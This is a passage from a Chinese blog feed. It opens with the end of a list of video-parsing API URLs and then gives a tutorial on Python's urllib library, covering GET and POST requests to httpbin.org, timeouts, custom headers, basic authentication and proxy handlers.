class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.51ckm.com&#x2F;Box.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.1717yun.com&#x2F;jx&#x2F;ty.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.3aym.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;beaacc.com&#x2F;api.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.zuilingxian.com&#x2F;jiexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.2tv.org&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;cdn.yangju.vip&#x2F;k&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.bbbbbb.me&#x2F;ipsign&#x2F;player.php?v&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;17kyun.com&#x2F;api.php?url&#x3D;</span><br></pre></td></tr></table></figure>


<h1 id="开发中"><a href="#开发中" class="headerlink" title="开发中"></a>开发中</h1>]]></content>
      <categories>
        <category>脚本编写</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫3.urllib库最详细</title>
    <url>/2021/02/12/Python%E7%88%AC%E8%99%AB3/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>书名《Python3 网络爬虫开发实战》，笔记这个都是我自己测试和网上找文章，书里面有的没有测试到位的我也补充了很多，先声明我是菜鸡</p>
</div>

<p><strong>Python 的强大之处就是提供了功能齐全的类库来帮助我们完成这些请求。最基础的 HTTP 库有 urllib、httplib2、requests、treq 等</strong></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p><strong>他有4个模块</strong></p>
</div> 





<table>
<thead>
<tr>
<th align="center">urllib库的模块</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>request</code>模块</td>
<td align="right">可以用来模拟发送请求</td>
</tr>
<tr>
<td align="center"><code>error</code>模块</td>
<td align="right">如果出现请求错误，我们可以捕获这些异常</td>
</tr>
<tr>
<td align="center"><code>parse</code>模块</td>
<td align="right">一个工具模块，提供了许多 URL 处理方法</td>
</tr>
<tr>
<td align="center"><code>robotparser</code>模块</td>
<td align="right">识别网站robots.txt 文件，判断哪些可以爬</td>
</tr>
</tbody></table>
<div class="note simple"><p>看一下他的文件里面的库模块</p>
</div>

<p>模块在<code>/usr/lib/python3/dist-packages/jedi/third_party/typeshed/stdlib/3/urllib/</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210206030234768.png" alt="image-20210206030234768"></p>
<h1 id="请求request模块请求"><a href="#请求request模块请求" class="headerlink" title="请求request模块请求"></a>请求<code>request</code>模块请求</h1><table>
<thead>
<tr>
<th align="center">request模块</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>urlopen()</code>函数</td>
<td align="right">urlopen()方法只能构建一个简单请求</td>
</tr>
<tr>
<td align="center"><code>Request()</code>类</td>
<td align="right">Request()类可以构建一个完整的请求</td>
</tr>
<tr>
<td align="center"><code>BaseHandler</code> 类</td>
<td align="right">它提供了最基本的方法,比如用于设置代理</td>
</tr>
<tr>
<td align="center"><code>OpenerDirector</code>类</td>
<td align="right">更高级的功能更底层功能</td>
</tr>
</tbody></table>
<div class="note info simple"><p>request模块模块在urllib文件夹里面.</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210172842654.png" alt="image-20210210172842654"></p>
<h2 id="请求方法urlopen-函数"><a href="#请求方法urlopen-函数" class="headerlink" title="请求方法urlopen()函数"></a>请求方法urlopen()函数</h2><p>urlopen()方法只能构建一个简单请求</p>
<p>request文件里面可以看一下文件有一个urlopen()方法<img src= "/img/loading2.gif" data-lazy-src="http://a.zssnp.top/zp/img/image-20210206005008088.png" alt="image-20210206005008088"></p>
<h3 id="get方式请求"><a href="#get方式请求" class="headerlink" title="get方式请求"></a>get方式请求</h3><p>这个函数发送一个请求下面的请求是get方式请求</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># get方式请求</span></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read() 方法可以得到返回的网页内容，decode()方法编码方式显示</span></span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210118153517085.png" alt="image-20210118153517085"></p>
<p><strong>分析一下上面的代码</strong></p>
<p>用<code>type()</code>函数查看一下上面的<code>response</code>变量的类型代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br><span class="line">print(type(response))</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210118153837638.png" alt="image-20210118153837638"></p>
<p><strong>下面有介绍</strong></p>
<p><code>read() </code>方法可以得到返回的网页内容</p>
<p><code>decode()</code>就是里面的编码</p>
<p>比如我们调用status属性，status属性是查看网站的状态码的</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br><span class="line">print(response.status)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210118154537942.png" alt="image-20210118154537942"></p>
<h3 id="post方式请求"><a href="#post方式请求" class="headerlink" title="post方式请求"></a>post方式请求</h3><p>urlopen()函数的<code>data</code> 参数</p>
<p><code>data</code> 参数是可选的，如果用<code>data</code> 参数就是post请求了</p>
<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse   <span class="comment"># 一个工具模块，提供了许多 URL 处理方法</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用到`bytes()`函数是bytes是字节流bytes对象</span></span><br><span class="line">data = bytes(urllib.parse.urlencode(&#123;<span class="string">&#x27;word&#x27;</span>: <span class="string">&#x27;hello&#x27;</span>&#125;), encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="comment"># post方式请求</span></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>, data=data)</span><br><span class="line"><span class="comment"># read() 方法可以得到返回的网页内容，decode()方法编码方式显示</span></span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;word&quot;: &quot;hello&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;10&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.9&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-60192088-7cac43ff16b0ff6376a5772d&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.45&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210206035724449.png" alt="image-20210206035724449"></p>
<p>上面的代码讲解</p>
<ol>
<li><p>第一行导入了<code>import urllib.parse</code>，</p>
<p>导入urllib库的parse模块，parse模块一个工具模块，提供了许多 URL 处理方法</p>
</li>
<li><p>第五行<code>data = bytes(urllib.parse.urlencode(&#123;&#39;word&#39;: &#39;hello&#39;&#125;), encoding=&#39;utf8&#39;)</code></p>
<p>用到<code>bytes()</code>函数是bytes是字节流bytes对象，字符串是字符串str 对象</p>
<p><code>encoding</code>是指定的编码格式</p>
<p>我们随便测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b= bytes(a, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>bytes()</code>函数里面的第一个测试<code>urllib.parse.urlencode(&#123;&#39;word&#39;: &#39;hello&#39;&#125;)</code>是键值对就是<code>word=hello</code>的意思</p>
<p>看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; urllib.parse.urlencode(&#123;&#39;word&#39;: &#39;hello&#39;&#125;)</span><br><span class="line">&#39;word&#x3D;hello&#39;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="请求超时设置"><a href="#请求超时设置" class="headerlink" title="请求超时设置"></a>请求超时设置</h3><p>urlopen()函数的<code>timeout</code> 参数</p>
<p>如果多长时间没有相应就会抛出异常</p>
<p><strong>下面的代码设置的是0.1</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># get方式请求  timeout超时值是0.1秒</span></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read() 方法可以得到返回的网页内容</span></span><br><span class="line">print(response.read())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">raceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;zss&#x2F;杂东西&#x2F;a.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">    response &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;, timeout&#x3D;0.1)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 214, in urlopen</span><br><span class="line">    return opener.open(url, data, timeout)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 517, in open</span><br><span class="line">    response &#x3D; self._open(req, data)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 534, in _open</span><br><span class="line">    result &#x3D; self._call_chain(self.handle_open, protocol, protocol +</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 494, in _call_chain</span><br><span class="line">    result &#x3D; func(*args)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 1375, in http_open</span><br><span class="line">    return self.do_open(http.client.HTTPConnection, req)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;urllib&#x2F;request.py&quot;, line 1349, in do_open</span><br><span class="line">    raise URLError(err)</span><br><span class="line">urllib.error.URLError: &lt;urlopen error timed out&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210206002133293.png" alt="image-20210206002133293"></p>
<p><strong>我们可以利用异常捕获</strong></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = urllib.request.urlopen(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError:</span><br><span class="line">    print(<span class="string">&#x27;时间超时了！&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">时间超时了！</span><br></pre></td></tr></table></figure>
<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p><code>context</code>参数，类型必须是<code>ssl.SSLContext</code>类型。</p>
<p><code>cafile</code>和<code>capath</code>这两个参数分别指定CA证书和它的路径，在请求HTTPS链接时候有用</p>
<h3 id="HTTPResposne-类型对象"><a href="#HTTPResposne-类型对象" class="headerlink" title="HTTPResposne 类型对象"></a><code>HTTPResposne</code> 类型对象</h3><p>看一下他的全部的属性和方法用<code>dir</code>函数查看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  urllib.request  <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">response = urlopen(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br><span class="line">print(dir(response))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__abstractmethods__&#39;, &#39;__class__&#39;, &#39;__del__&#39;, &#39;__delattr__&#39;, &#39;__dict__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__eq__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__lt__&#39;, &#39;__module__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__next__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_abc_impl&#39;, &#39;_checkClosed&#39;, &#39;_checkReadable&#39;, &#39;_checkSeekable&#39;, &#39;_checkWritable&#39;, &#39;_check_close&#39;, &#39;_close_conn&#39;, &#39;_get_chunk_left&#39;, &#39;_method&#39;, &#39;_peek_chunked&#39;, &#39;_read1_chunked&#39;, &#39;_read_and_discard_trailer&#39;, &#39;_read_next_chunk_size&#39;, &#39;_read_status&#39;, &#39;_readall_chunked&#39;, &#39;_readinto_chunked&#39;, &#39;_safe_read&#39;, &#39;_safe_readinto&#39;, &#39;begin&#39;, &#39;chunk_left&#39;, &#39;chunked&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;code&#39;, &#39;debuglevel&#39;, &#39;detach&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;fp&#39;, &#39;getcode&#39;, &#39;getheader&#39;, &#39;getheaders&#39;, &#39;geturl&#39;, &#39;headers&#39;, &#39;info&#39;, &#39;isatty&#39;, &#39;isclosed&#39;, &#39;length&#39;, &#39;msg&#39;, &#39;peek&#39;, &#39;read&#39;, &#39;read1&#39;, &#39;readable&#39;, &#39;readinto&#39;, &#39;readinto1&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;reason&#39;, &#39;seek&#39;, &#39;seekable&#39;, &#39;status&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;url&#39;, &#39;version&#39;, &#39;will_close&#39;, &#39;writable&#39;, &#39;write&#39;, &#39;writelines&#39;]</span><br></pre></td></tr></table></figure>
<h2 id="构建请求内容Request-类"><a href="#构建请求内容Request-类" class="headerlink" title="构建请求内容Request()类"></a>构建请求内容Request()类</h2><p>request文件里面可以看一下文件有一个Request()类</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210206005211958.png" alt="image-20210206005211958"></p>
<p><strong>urlopen()方法只能构建一个简单请求，Request()类可以构建一个完整的请求</strong></p>
<p>比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse   <span class="comment"># 一个工具模块，提供了许多 URL 处理方法</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用到`bytes()`函数是bytes是字节流bytes对象</span></span><br><span class="line">data = bytes(urllib.parse.urlencode(&#123;<span class="string">&#x27;word&#x27;</span>: <span class="string">&#x27;hello&#x27;</span>&#125;), encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="comment"># post方式请求</span></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>, data=data)</span><br><span class="line"><span class="comment"># read() 方法可以得到返回的网页内容，decode()方法编码方式显示</span></span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<p><strong>可以看见下面的<code>User-Agent</code>字段是<code>Python-urllib/3.9</code>不是我们的浏览器，我们就可以用Request()类添加了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;word&quot;: &quot;hello&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;10&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.9&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-601a1f43-352ed18d0b631c951537de2b&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.45&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Request-类的参数"><a href="#Request-类的参数" class="headerlink" title="Request()类的参数"></a>Request()类的参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urllib.request.Request(url, data=<span class="literal">None</span>, headers=&#123;&#125;, origin_req_host=<span class="literal">None</span>, unverifiable=<span class="literal">False</span>, method=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>上面的参数</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">url</td>
<td align="right">用于请求 URL，这是必传参数，其他都是可选参数</td>
</tr>
<tr>
<td align="center">data</td>
<td align="right">必须传 <code>bytes</code>（字节流）类型的，这个就是POST的数据内容</td>
</tr>
<tr>
<td align="center">headers</td>
<td align="right"><code>headers</code> 是一个字典，它就是请求头</td>
</tr>
<tr>
<td align="center">origin_req_host</td>
<td align="right">指的是请求方的 host 名称或者 IP 地址</td>
</tr>
<tr>
<td align="center">unverifiable</td>
<td align="right">没有抓取图像的权限就是True，他默认是False</td>
</tr>
<tr>
<td align="center">method</td>
<td align="right">用来指示请求使用的方法，比如 GET、POST 和 PUT 等</td>
</tr>
</tbody></table>
<h3 id="创建制定请求内容测试"><a href="#创建制定请求内容测试" class="headerlink" title="创建制定请求内容测试"></a>创建制定请求内容测试</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse   <span class="comment"># 一个工具模块，提供了许多 URL 处理方法</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改请求头信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST的数据内容字典类型的</span></span><br><span class="line">dict = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Germey&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用到`bytes()`函数是bytes是字节流bytes对象，dict是上面的字典变量</span></span><br><span class="line">data = bytes(urllib.parse.urlencode(dict), encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建请求内容</span></span><br><span class="line">req = urllib.request.Request(url=url, data=data, headers=headers, method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># post方式请求</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read() 方法可以得到返回的网页内容，decode()方法编码方式显示</span></span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p>可以看见请求头的<code>User-Agent</code>字段和<code>Host</code>字段都被我修改成我制定的了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;Germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;11&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-601a2743-7648e6e64bf3d1423959aba7&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.45&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><div class="note info simple"><p>但是对于一些更高级的操作（比如 Cookies 处理、代理设置等）就可以用下面的<code>request</code>模块的类了</p>
</div>

<h3 id="BaseHandler-类"><a href="#BaseHandler-类" class="headerlink" title="BaseHandler 类"></a><code>BaseHandler</code> 类</h3><p>request文件里面可以看一下文件有一个BaseHandler类</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210207183724085.png" alt="image-20210207183724085"></p>
<p><code>urllib.request</code> 模块里的 <code>BaseHandler</code> 类，它是所有其他 <code>Handler</code> 的父类，它提供了最基本的方法，例如 <code>default_open()</code>、<code>protocol_request()</code> 等</p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>举例如下</p>
</div>

<table>
<thead>
<tr>
<th align="center">类名</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong><code>HTTPDefaultErrorHandler</code></strong></td>
<td align="right">处理 HTTP 响应错误，错误会抛出 <code>HTTPError</code> 类型的异常</td>
</tr>
<tr>
<td align="center"><strong><code>HTTPRedirectHandler</code></strong></td>
<td align="right">用于处理重定向</td>
</tr>
<tr>
<td align="center"><strong><code>HTTPCookieProcessor</code></strong></td>
<td align="right">用于处理 Cookies</td>
</tr>
<tr>
<td align="center"><strong><code>ProxyHandler</code></strong></td>
<td align="right">用于设置代理，默认代理为空</td>
</tr>
<tr>
<td align="center"><strong><code>HTTPPasswordMgr</code></strong></td>
<td align="right">用于管理密码，它维护了用户名和密码的表</td>
</tr>
<tr>
<td align="center"><strong><code>HTTPBasicAuthHandler</code></strong></td>
<td align="right">管理认证，链接打开时需要认证，可以用它来解决认证问题</td>
</tr>
</tbody></table>
<p>还有其他的<a href="https://docs.python.org/3/library/urllib.request.html#urllib.request.BaseHandler">https://docs.python.org/3/library/urllib.request.html#urllib.request.BaseHandler</a></p>
<h3 id="OpenerDirector类"><a href="#OpenerDirector类" class="headerlink" title="OpenerDirector类"></a><code>OpenerDirector</code>类</h3><p>request文件里面可以看一下文件有一个<code>OpenerDirector</code>类</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210207183914420.png" alt="image-20210207183914420"></p>
<div class="note info simple"><p>OpenerDirector我们成为Opener</p>
</div>

<div class="note info simple"><p>上面使用的 <code>Request</code> 和 <code>urlopen()</code> 类相当于给你封装好了常用的请求方法，完成基本的操作</p>
<p>更高级的功能更底层功能就用到了 <code>Opener</code></p>
</div>

<h4 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h4><p>应为我没有环境我就不测试是了就叫书上的给已过来了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210206135356903.png" alt="image-20210206135356903">下面是验证代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> HTTPPasswordMgrWithDefaultRealm, HTTPBasicAuthHandler, build_opener</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;username&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;password&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost:5000/&#x27;</span></span><br><span class="line"></span><br><span class="line">p = HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">p.add_password(<span class="literal">None</span>, url, username, password)</span><br><span class="line">auth_handler = HTTPBasicAuthHandler(p)</span><br><span class="line">opener = build_opener(auth_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = opener.open(url)</span><br><span class="line">    html = result.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    print(html)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure>
<p>上面的类的作用可以查看官方文档很详细的<a href="https://docs.python.org/3/library/urllib.request.html#basehandler-objects">https://docs.python.org/3/library/urllib.request.html#basehandler-objects</a></p>
<h4 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在request库里面导入ProxyHandler对象和build_opener </span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener </span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加代理字典类型的键值对</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8889&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 多处理程序 </span></span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 发送请求</span></span><br><span class="line">    response = opener.open(<span 